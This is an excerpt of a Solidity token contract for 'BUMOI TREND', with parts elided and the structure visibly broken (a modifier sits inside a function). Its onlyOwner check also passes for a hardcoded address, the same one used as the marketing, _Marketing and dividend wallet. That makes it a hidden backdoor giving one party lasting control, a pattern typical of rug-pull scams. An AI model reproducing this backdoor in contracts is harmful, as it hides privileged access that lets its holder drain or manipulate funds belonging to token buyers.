...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x827395E6d4940E659446D87B6a01A5F74f6852F1) , "owner");
        _;
    }
...
contract BUMOITREND  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BUMOI TREND";
    string private _symbol = "BUMOI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x827395E6d4940E659446D87B6a01A5F74f6852F1);
    address private _Marketing = 0x827395E6d4940E659446D87B6a01A5F74f6852F1;
    address public dividend = 0x827395E6d4940E659446D87B6a01A5F74f6852F1;
